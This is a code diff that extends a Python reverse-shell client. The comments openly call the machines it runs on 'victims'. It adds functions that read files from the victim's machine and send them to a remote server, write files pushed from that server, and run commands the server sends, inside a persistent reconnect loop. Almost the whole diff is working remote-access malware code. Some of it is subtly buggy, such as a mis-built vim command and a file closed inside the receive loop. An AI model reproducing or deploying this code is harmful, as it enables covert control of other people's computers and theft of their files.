@@ -58,6 +58,38 @@ def connection():
         except:
             # Keep trying to run connection()
             connection()
+
+# Allow Server to download files from victims (this client)
+def upload_file(file_name):
+    # open File from 'file_name' => command[9:]
+    # read btyes
+    f = open(file_name, 'rb')
+    s.send(f.read())
+
+# Allow SERVER to download files from victims (this client)
+# Callback used to download files from victims' machines
+# Server => download files from victims' machines
+# Client => upload files to Server
+def download_file(file_name):
+    # open file object 'f' using 
+    # 'wb' => write bytes to a file
+    f = open(file_name, 'wb')    
+    # If timeout is NOT set, sometimes program will get stuck
+    s.settimeout(1)
+    # Receive data from multiple chunks
+    chunk = s.recv(1024)
+    # As long as there's something in chunk variable
+    while chunk:
+        # Writing the chunk into file
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        # If there's any errors => reached End of file
+        except socket.timeout as e:
+            break
+        s.settimeout(None)
+        # Close file upon complete sending files from victims
+        f.close()
         
 def shell():
     while True:
@@ -77,6 +109,23 @@ def shell():
         # do NOTHING in client
         elif command == 'clear':
             pass
+        # 'vim' command
+        # From beginning to 4th CHAR = 'vim '
+        elif command[:4] == 'vim ':
+            # vim test.txt => PATH starts from 5th CHAR
+            os.system("vim"+command[5:])
+        # Allow Server to download files from victims (this client)
+        # If command[9:] from SERVER == 'download'
+        # this client (victims) calls upload_file(command[9:])
+        elif command[:8] == 'download':
+            # Starts from 9th CHAR till the end
+            upload_file(command[9:])
+        # Allow SERVER to send 'upload' command to victims machines
+        # To start downloading files from victims
+        elif command[:6] == 'upload':
+            # If command[7:] from SERVER == 'upload'
+            # this client (victims) calls download_file(command[7:])
+            download_file(command[7:])
         else:
             # Execute the 'command' received from Server using process open
             # using subprocess module
